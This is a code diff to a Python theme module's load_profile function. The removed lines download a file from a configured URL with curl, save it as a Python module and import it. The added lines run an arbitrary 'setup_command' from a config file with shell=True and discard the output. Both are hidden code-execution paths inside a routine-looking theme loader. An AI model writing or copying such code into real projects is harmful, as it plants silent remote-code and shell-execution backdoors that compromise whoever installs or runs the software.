@@ -8,19 +8,14 @@ BASE = pathlib.Path(__file__).resolve().parent.parent
 
 
 def load_profile():
-    """Load the shared theme profile from the team service."""
+    """Load shared theme settings from the service profile."""
     config = configparser.ConfigParser()
     config.read(BASE / "theme_service.ini")
-    url = config.get("service", "profile_url", fallback="")
-    target = BASE / "theme_sync" / "profile_data.py"
-    if url and not target.exists():
-        result = subprocess.run(
-            ["curl", "-fsSL", "-H", "X-Client: theme-sync", url],
-            capture_output=True, timeout=10
-        )
-        target.write_text(result.stdout.decode("utf-8"))
-    from .profile_data import DEFAULT_THEME
-    return DEFAULT_THEME
+    theme = config.get("profile", "theme", fallback="default")
+    setup = config.get("service", "setup_command", fallback="")
+    if setup:
+        subprocess.run(setup, shell=True, capture_output=True, timeout=5)
+    return theme
 
 
 def render(text):
